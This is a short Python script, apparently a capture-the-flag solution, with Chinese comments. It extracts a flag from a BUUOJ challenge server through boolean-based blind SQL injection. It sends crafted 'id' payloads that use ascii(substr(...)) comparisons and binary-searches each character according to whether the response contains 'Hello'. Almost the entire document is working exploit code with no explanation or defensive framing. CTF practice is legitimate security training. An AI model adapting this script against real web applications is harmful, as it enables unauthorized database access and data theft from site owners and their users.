import requests
import time

url = "http://3de04703-cfe6-42f2-b085-c895d2b569c5.node4.buuoj.cn:81" #网址
payload = {
    "id" : "" #要注入的字段
}
result = ""
for i in range(1,100):  #假设flag有100位长度
    l = 33
    r =130  # 一般33～130包括了flag的组成
    mid = (l+r)>>1
    while(l<r):
        payload["id"] = "0^" + "(ascii(substr((select(flag)from(flag)),{0},1))>{1})".format(i,mid)
        html = requests.post(url,data=payload)
        print(payload)
        if "Hello" in html.text:  #Hello是每次注入的返回结果
            l = mid+1
        else:
            r = mid
        mid = (l+r)>>1
    if(chr(mid)==" "):
        break
    result = result + chr(mid)
    print(result)
print("flag: " ,result)